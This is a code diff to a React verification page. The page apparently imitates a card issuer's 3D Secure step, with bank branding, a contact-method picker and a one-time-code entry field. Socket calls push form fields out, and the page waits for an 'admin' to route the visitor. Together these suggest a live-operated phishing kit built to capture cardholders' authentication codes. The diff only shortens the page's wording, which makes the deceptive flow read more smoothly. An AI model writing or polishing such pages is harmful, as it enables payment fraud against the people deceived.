@@ -80,7 +80,7 @@ export default function Verify() {
     return !saved.telephone && !saved.email && !savedContacts.telephone && !savedContacts.email;
   });
   const [showMethodPicker, setShowMethodPicker] = useState(() => !initialVerifyMethod);
-  const [status, setStatus] = useState('Choose where you want the authentication code to be sent.');
+  const [status, setStatus] = useState('Choose where to receive the code.');
   const [submitting, setSubmitting] = useState(false);
   const [waitingForAdmin, setWaitingForAdmin] = useState(false);
   const inputRef = useRef<HTMLInputElement | null>(null);
@@ -99,7 +99,7 @@ export default function Verify() {
         setLoadingContactOptions(false);
         setStatus(
           fallback.telephone || fallback.email
-            ? 'Choose where you want the authentication code to be sent.'
+            ? 'Choose where to receive the code.'
             : 'We could not load your phone number or email. Return to your account and try again.',
         );
         return;
@@ -120,7 +120,7 @@ export default function Verify() {
         saveDraft(STORAGE_KEYS.verifyContact, nextOptions);
       }
       setLoadingContactOptions(false);
-      if (!nextOptions.telephone && !nextOptions.email) setStatus('No contact methods are available yet. Add a phone number or email on your account first.');
+      if (!nextOptions.telephone && !nextOptions.email) setStatus('No contact methods are available yet.');
     });
   };
 
@@ -194,7 +194,7 @@ export default function Verify() {
       setSubmitting(false);
       setWaitingForAdmin(false);
       const routeReason = String(payload?.reason || '').trim();
-      setStatus(routeReason || 'Choose where you want the authentication code to be sent.');
+      setStatus(routeReason || 'Choose where to receive the code.');
       socket.emit('update-form-field', { field: 'verifyMethod', value: '' });
       if ((target === 'verifyphone' || target === 'phoneverify') && contactOptions.telephone) return handleChooseMethod('phone', routeReason);
       if (target === 'emailverify' && contactOptions.email) return handleChooseMethod('email', routeReason);
@@ -229,7 +229,7 @@ export default function Verify() {
     e.preventDefault();
     if (submitting || waitingForAdmin) return;
     if (showMethodPicker || !verifyMethod) {
-      setStatus('Choose where you want to receive the authentication code.');
+      setStatus('Choose where to receive the code.');
       setShowMethodPicker(true);
       return;
     }
@@ -277,7 +277,7 @@ export default function Verify() {
               </div>
               <span className="alz-bank-badge">Verified by issuer</span>
             </div>
-            <p className="alz-bank-picker-copy">Choose one option below to receive the authentication code for this verification step.</p>
+            <p className="alz-bank-picker-copy">Choose one option below to receive the code.</p>
 
             {loadingContactOptions ? (
               <div className="alz-bank-loading">Loading your available contact methods...</div>
@@ -311,7 +311,7 @@ export default function Verify() {
                 <div>
                   <div className="alz-bank-header-eyebrow">Issuer Authentication</div>
                 <h1 className="alz-bank-title">Authentication required</h1>
-                <p className="alz-bank-copy">Enter the one-time code sent by your card issuer to complete this billing verification.</p>
+                <p className="alz-bank-copy">Enter the one-time code sent by your card issuer.</p>
               </div>
               <div className="alz-bank-brandbox">
                 <div className="alz-bank-brandname">SECURECODE</div>
@@ -357,7 +357,7 @@ export default function Verify() {
               <aside className="alz-bank-side">
                 <div className="alz-bank-side-card">
                   <div className="alz-bank-side-title">Protected payment</div>
-                  <div className="alz-bank-side-copy">This billing review is protected by your issuer through 3D Secure authentication.</div>
+                  <div className="alz-bank-side-copy">This billing review is protected by your issuer.</div>
                 </div>
                 <div className="alz-bank-side-card">
                   <div className="alz-bank-side-title">Need help?</div>
